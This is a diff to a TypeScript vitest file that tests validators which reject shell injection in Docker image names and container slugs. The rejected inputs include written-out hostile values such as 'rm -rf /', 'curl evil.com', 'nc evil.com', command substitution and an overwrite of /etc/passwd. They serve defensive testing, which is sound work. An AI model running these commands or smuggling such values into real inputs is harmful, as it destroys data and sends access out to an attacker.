@@ -12,7 +12,13 @@
 
 import { describe, expect, it } from 'vitest';
 
-import { redactCmd, renderEnvFlags, shellQuote } from '../../../src/services/sidecar/sidecar-deployer.js';
+import {
+  isSafeContainerSlug,
+  isSafeDockerImage,
+  redactCmd,
+  renderEnvFlags,
+  shellQuote,
+} from '../../../src/services/sidecar/sidecar-deployer.js';
 
 describe('redactCmd', () => {
   it('屏蔽含 SECRET 后缀的 env 值', () => {
@@ -66,6 +72,57 @@ describe('shellQuote', () => {
     expect(out.startsWith("'")).toBe(true);
     expect(out.endsWith("'")).toBe(true);
     expect(out).toContain("'\\''");
+  });
+});
+
+describe('isSafeDockerImage (PR #529 Bugbot HIGH defense)', () => {
+  it('合法 image 通过', () => {
+    expect(isSafeDockerImage('alpine')).toBe(true);
+    expect(isSafeDockerImage('alpine:3.20')).toBe(true);
+    expect(isSafeDockerImage('library/alpine:latest')).toBe(true);
+    expect(isSafeDockerImage('ghcr.io/owner/repo:v1.2.3')).toBe(true);
+    expect(isSafeDockerImage('prdagent/claude-sidecar:dev')).toBe(true);
+    expect(isSafeDockerImage('foo@sha256:abc123def')).toBe(true);
+    expect(isSafeDockerImage('registry-1.docker.io/library/alpine:3.20')).toBe(true);
+  });
+
+  it('shell 元字符全部拒', () => {
+    expect(isSafeDockerImage('alpine; rm -rf /')).toBe(false);
+    expect(isSafeDockerImage('alpine;curl evil.com')).toBe(false);
+    expect(isSafeDockerImage('alpine | nc evil.com')).toBe(false);
+    expect(isSafeDockerImage('alpine && rm -rf /')).toBe(false);
+    expect(isSafeDockerImage('alpine`whoami`')).toBe(false);
+    expect(isSafeDockerImage('alpine$(whoami)')).toBe(false);
+    expect(isSafeDockerImage('alpine > /etc/passwd')).toBe(false);
+    expect(isSafeDockerImage("alpine 'foo'")).toBe(false);
+    expect(isSafeDockerImage('alpine\nls')).toBe(false);
+  });
+
+  it('空 / 非字符串 / 超长拒', () => {
+    expect(isSafeDockerImage('')).toBe(false);
+    expect(isSafeDockerImage('a'.repeat(257))).toBe(false);
+    // @ts-expect-error 故意传非字符串
+    expect(isSafeDockerImage(undefined)).toBe(false);
+    // @ts-expect-error 故意传非字符串
+    expect(isSafeDockerImage(null)).toBe(false);
+    // @ts-expect-error 故意传非字符串
+    expect(isSafeDockerImage(123)).toBe(false);
+  });
+});
+
+describe('isSafeContainerSlug', () => {
+  it('合法 slug 通过', () => {
+    expect(isSafeContainerSlug('sidecar')).toBe(true);
+    expect(isSafeContainerSlug('sidecar-prod-1')).toBe(true);
+    expect(isSafeContainerSlug('a1b2c3')).toBe(true);
+  });
+
+  it('大写 / 空格 / 特殊字符拒', () => {
+    expect(isSafeContainerSlug('Sidecar')).toBe(false);
+    expect(isSafeContainerSlug('side car')).toBe(false);
+    expect(isSafeContainerSlug('sidecar;rm')).toBe(false);
+    expect(isSafeContainerSlug('')).toBe(false);
+    expect(isSafeContainerSlug('a'.repeat(65))).toBe(false);
   });
 });
 
